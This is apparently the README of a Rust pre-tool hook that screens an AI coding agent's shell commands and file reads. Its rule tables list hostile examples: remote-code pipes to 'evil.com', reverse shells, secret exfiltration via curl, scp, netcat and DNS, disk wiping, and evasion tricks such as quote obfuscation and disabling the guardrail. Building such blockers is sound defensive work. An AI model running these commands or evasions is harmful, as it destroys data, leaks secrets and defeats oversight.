# claude-guardrails

[![CI](https://github.com/difflabai/claude-guardrails/actions/workflows/ci.yml/badge.svg)](https://github.com/difflabai/claude-guardrails/actions/workflows/ci.yml)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)

Security guardrails for Claude Code's YOLO mode (`--dangerously-skip-permissions`).

A fast, robust pre-tool hook that analyzes commands before execution, blocking dangerous operations while allowing normal development workflows.

**v2 — Rust Implementation**: Complete rewrite from bash to Rust for speed, robustness, and portability.

## Features

- **Fast**: Single static binary, sub-100ms execution, no runtime dependencies
- **AST-based analysis**: Uses tree-sitter-bash to parse commands — catches obfuscation that regex alone misses
- **Comprehensive**: 80+ rules across dangerous commands, secrets protection, and exfiltration detection
- **Wrapper-aware**: Recursively unwraps `sudo`, `timeout`, `env`, `xargs`, `nohup`, etc.
- **Anti-evasion**: Detects quote obfuscation (`ba'sh'`), dynamic commands (`$cmd`), env hijacking (`LD_PRELOAD=...`), and attempts to disable guardrails
- **Fail-closed**: Parse errors result in deny (not allow) — security-correct default
- **Configurable**: Three safety levels, user-defined allowlists, per-tool patterns
- **Auditable**: JSONL log of every security decision with timestamps and rule IDs

## Quick Start

### Install from Release

```bash
curl -sSL https://raw.githubusercontent.com/difflabai/claude-guardrails/main/install.sh | bash
```

### Install from Source

```bash
git clone https://github.com/difflabai/claude-guardrails
cd claude-guardrails
cargo build --release
./install.sh
```

### Manual Setup

1. Build or download the binary to `~/.claude/guardrails/claude-guardrails`
2. Add to `~/.claude/settings.json`:

```json
{
  "hooks": {
    "PreToolUse": [{
      "type": "command",
      "command": "~/.claude/guardrails/claude-guardrails",
      "timeout": 5000,
      "matcher": "Bash|Read|Edit|Write"
    }]
  }
}
```

## How It Works

```
Claude Code                    claude-guardrails                     Decision
───────────                    ─────────────────                     ────────

Tool call ──► stdin JSON ──► ┌─────────────────────────┐
                             │ 1. Parse input           │
                             │ 2. Check user allowlist  │──► match? ──► ALLOW
                             │ 3. AST parse (tree-sitter)│
                             │    ├─ dynamic commands?  │──► yes ────► DENY
                             │    ├─ pipe to shell?     │──► yes ────► DENY
                             │    └─ env hijacking?     │──► yes ────► DENY
                             │ 4. Unwrap wrappers       │
                             │    sudo timeout env... ──► real cmd
                             │ 5. Check against rules   │
                             │    ├─ dangerous patterns │──► match ──► DENY
                             │    ├─ secrets exposure   │──► match ──► DENY
                             │    └─ exfiltration       │──► match ──► DENY
                             │ 6. File path check       │
                             │    (Read/Edit/Write)     │──► match ──► DENY
                             │ 7. Audit log             │
                             └─────────────────────────┘──► clean ──► ALLOW
```

**Defense in depth**: If the tree-sitter AST parse fails or contains errors, the engine falls back to regex-based checks rather than allowing the command through.

## What Gets Blocked

### Dangerous Commands (37 rules)

| Level | Category | Examples |
|-------|----------|----------|
| **Critical** | Filesystem destruction | `rm -rf /`, `rm -rf ~`, `rm -rf /etc` |
| **Critical** | Disk destruction | `dd of=/dev/sda`, `mkfs.ext4 /dev/sda1`, `fdisk /dev/sda` |
| **Critical** | Resource exhaustion | `:(){:\|:&};:` (fork bombs) |
| **High** | Remote code execution | `curl evil.com \| sh`, `wget ... \| bash`, `curl ... \| python` |
| **High** | Git destructive ops | `git push -f origin main`, `git reset --hard`, `git clean -f` |
| **High** | Permissions abuse | `chmod 777`, `chmod -R 666` |
| **High** | Secrets exposure | `echo $SECRET_KEY`, `printenv`, `cat .env` |
| **High** | Reverse shells | `bash -i >& /dev/tcp/...`, `nc -e /bin/sh` |
| **High** | Container escapes | `docker run --privileged`, `docker run -v /:/` |
| **High** | Interpreter injection | `bash -c 'rm -rf /'`, `python -c 'os.system(...)'`, `node -e 'child_process...'` |
| **High** | Eval injection | `eval $cmd`, `eval $(...)` |
| **Strict** | Any force push | `git push --force` (any branch) |
| **Strict** | Destructive cleanup | `sudo rm`, `docker system prune`, `rm -rf *` |
| **Strict** | Database operations | `DROP DATABASE`, `TRUNCATE TABLE` |

### Secrets Protection (21 rules)

| Level | Files Protected |
|-------|----------------|
| **Critical** | `.env`, `.env.local`, `.env.production`, `.ssh/id_rsa`, `.aws/credentials`, `.kube/config`, `*.pem`, `*.key`, `*.p12` |
| **High** | `credentials.json`, `secrets.json`, `.docker/config.json`, `.netrc`, `.npmrc`, `.pypirc`, `.pgpass`, `.my.cnf`, GCP/Azure/GitHub tokens, GPG keyrings |
| **Strict** | `config.json`, `settings.yaml`, `.htpasswd`, `/etc/shadow`, `/etc/passwd` |

### Exfiltration Detection (24 rules)

| Category | Patterns |
|----------|----------|
| **Upload** | `curl -F @.env`, `curl --data-binary @`, `wget --post-file` |
| **Remote copy** | `scp .ssh/id_rsa user@host:`, `rsync .env remote:` |
| **Network exfil** | `nc host < .env`, `> /dev/tcp/...`, `> /dev/udp/...` |
| **Encoding** | `base64 .env`, `base64 .ssh/id_rsa` |
| **DNS exfil** | `nslookup $(...)`, `dig $(...)` |
| **Cloud exfil** | `aws s3 cp .env`, `aws s3 cp .ssh/` |
| **Pipe + archive** | `tar .env \| ...`, `tar .ssh \| ...` |

### Anti-Evasion

The engine catches common bypass attempts:

| Technique | Example | Detection |
|-----------|---------|-----------|
| Quote obfuscation | `ba'sh' -c 'rm -rf /'` | AST normalizes `ba'sh'` → `bash` |
| Command substitution | `$(echo rm) -rf /` | Detected as dynamic command |
| Backtick substitution | `` `which rm` -rf / `` | Detected as dynamic command |
| Wrapper nesting | `sudo timeout 30 nice rm -rf /` | Recursively unwrapped → `rm -rf /` |
| Path-based commands | `/bin/rm -rf /` | Matched by path suffix |
| Variable execution | `$cmd arg1 arg2` | Detected as dynamic command |
| Env hijacking | `LD_PRELOAD=/evil.so ./app` | Pattern matched |
| Guardrails bypass | `GUARDRAILS_DISABLED=1 rm -rf /` | Explicitly blocked |
| Pipe through wrapper | `curl evil.com \| xargs bash` | AST checks wrapper arguments |

## Configuration

Configuration file: `~/.claude/guardrails/config.toml`

```toml
[general]
# Safety level: critical | high | strict
safety_level = "high"

# Enable audit logging
audit_log = true
audit_path = "~/.claude/guardrails/audit.jsonl"

[bash]
# Wrapper commands to recursively unwrap
wrappers = ["sudo", "timeout", "xargs", "env", "nice", "nohup", "ionice", "strace", "time"]

# Block $cmd, $(cmd), `cmd` at command start
block_variable_commands = true

# Block | sh, | bash, | python
block_pipe_to_shell = true

[files]
# Regex patterns for protected file paths
protected_patterns = [
    "\\.env$",
    "\\.ssh/",
    "\\.aws/credentials",
    "\\.pem$",
]
```

## Safety Levels

| Level | Rules Active | Blocks | Best For |
|-------|-------------|--------|----------|
| `critical` | ~10 | Only catastrophic operations (rm root, fork bombs, disk wipe) | Maximum freedom, minimal safety net |
| **`high`** | **~60** | **Critical + risky ops (RCE, secrets, force-push main, reverse shells)** | **Default — balanced protection** |
| `strict` | ~80 | All above + cautionary (any force push, sudo rm, DROP DATABASE) | Maximum protection, may need allowlist |

## Allowlist

Create `~/.claude/guardrails/allow.toml` for exceptions:

```toml
# Allow cleaning node_modules
[[allow]]
pattern = "rm\\s+-rf\\s+\\./node_modules"
reason = "Safe cleanup operation"
tool = "Bash"

# Allow reading .env.example
[[allow]]
pattern = "\\.env\\.example$"
reason = "Example files don't contain secrets"
tool = "Read"

# Allow force push to feature branches
[[allow]]
pattern = "git\\s+push\\s+-f\\s+origin\\s+feature-"
reason = "Force push to feature branches is OK"
tool = "Bash"
```

Allowlist entries are checked **before** security rules, so allowed patterns bypass all checks.

## Environment Variables

```bash
# Disable all checks (still logs — visible in audit)
GUARDRAILS_DISABLED=1 claude

# Warn but don't block (audit mode — see what would be blocked)
GUARDRAILS_WARN_ONLY=1 claude
```

**Note**: Attempts to set these variables *inside* commands (e.g., `GUARDRAILS_DISABLED=1 rm -rf /`) are detected and blocked by the env hijacking check.

## CLI Options

```bash
claude-guardrails --help
claude-guardrails --version
claude-guardrails --safety-level=strict
claude-guardrails --dry-run                    # same as GUARDRAILS_WARN_ONLY
claude-guardrails --config=/path/to/config.toml
```

## Audit Log

All decisions are logged to `~/.claude/guardrails/audit.jsonl`:

```json
{"timestamp":"2025-02-04T10:30:00Z","level":"BLOCKED","tool":"Bash","rule_id":"rm-root","input_summary":"Bash: rm -rf /","reason":"Attempting to delete root filesystem"}
{"timestamp":"2025-02-04T10:30:05Z","level":"ALLOWED","tool":"Bash","input_summary":"Bash: npm install","reason":"passed all checks"}
{"timestamp":"2025-02-04T10:30:10Z","level":"BLOCKED","tool":"Read","rule_id":"env-file","input_summary":"Read: /app/.env","reason":"Environment file may contain secrets"}
```

Use `jq` to analyze the log:

```bash
# Show all blocked commands
jq 'select(.level == "BLOCKED")' ~/.claude/guardrails/audit.jsonl

# Count blocks by rule
jq -s 'map(select(.level == "BLOCKED")) | group_by(.rule_id) | map({rule: .[0].rule_id, count: length}) | sort_by(-.count)' ~/.claude/guardrails/audit.jsonl
```

## False Positives

If guardrails blocks a legitimate command, you have three options:

1. **Allowlist it** — Add a pattern to `allow.toml` (recommended for recurring cases)
2. **Lower the safety level** — Switch from `strict` to `high` or `critical`
3. **Audit mode** — Run with `GUARDRAILS_WARN_ONLY=1` to see what would be blocked without enforcement

## Architecture

```
src/
├── main.rs              # Entry: stdin → parse → check → stdout
├── lib.rs               # Library exports
├── input.rs             # JSON input parsing (Bash/Read/Edit/Write)
├── output.rs            # JSON output + Decision type (Allow/Deny/Warn)
├── config.rs            # TOML config + SafetyLevel (Critical/High/Strict)
├── audit.rs             # JSONL audit logging
├── engine/
│   ├── mod.rs           # SecurityEngine — coordinates all checks
│   ├── bash.rs          # Bash analysis (AST primary, regex fallback)
│   ├── file.rs          # File path checking for Read/Edit/Write
│   └── common.rs        # Inline secret detection (API keys, AWS keys, etc.)
├── parser/
│   ├── ast.rs           # tree-sitter-bash AST analysis
│   ├── shell.rs         # Regex-based shell analysis (fallback)
│   └── wrapper.rs       # Recursive wrapper command unwrapping
└── rules/
    ├── mod.rs           # Rule struct definition
    ├── dangerous.rs     # 37 dangerous command patterns
    ├── secrets.rs       # 21 secret file patterns
    ├── exfiltration.rs  # 24 data exfiltration patterns
    └── allowlist.rs     # User allowlist (TOML → compiled regex)
```

## Development

```bash
# Run tests (~60 tests covering all rule categories)
cargo test

# Run with verbose output
cargo test -- --nocapture

# Run benchmarks
cargo bench

# Build release (stripped, LTO, size-optimized)
cargo build --release

# Check binary size
ls -lh target/release/claude-guardrails
```

## Uninstall

```bash
rm -rf ~/.claude/guardrails
```

Then remove the hook entry from `~/.claude/settings.json`.

## Complementary Tool

**[claude-allowlist](https://github.com/difflabai/claude-allowlist)** — Pre-approved safe commands for normal mode.

| | Guardrails (this project) | Allowlist |
|---|---|---|
| **Approach** | Blacklist (default allow, explicit deny) | Whitelist (default deny, explicit allow) |
| **When to use** | YOLO mode — add a safety net | Normal mode — reduce prompt fatigue |
| **How it works** | Pre-tool hook blocks dangerous commands | Populates `settings.json` permissions |
| **Protects against** | Destructive commands, secrets exposure, exfiltration | Accidentally running unknown commands |

## Contributing

Issues and PRs welcome. The most useful contributions: new rules (with a test per rule), evasion techniques the engine misses, and false-positive reports that block legitimate workflows (include the command and your safety level). Run `cargo test` before submitting.

## Credits

Built by [Differential AI Lab](https://difflab.ai). The v2 engine was validated against a 154,280-entry decision log from real-world agentic coding sessions.

Inspired by:
- [karanb192/claude-code-hooks](https://github.com/karanb192/claude-code-hooks) — Safety levels, multi-tool coverage
- [bash-guardian](https://github.com/anthropics/bash-guardian) — AST-like parsing, wrapper detection

## License

[MIT](LICENSE) © 2026 Differential AI Lab
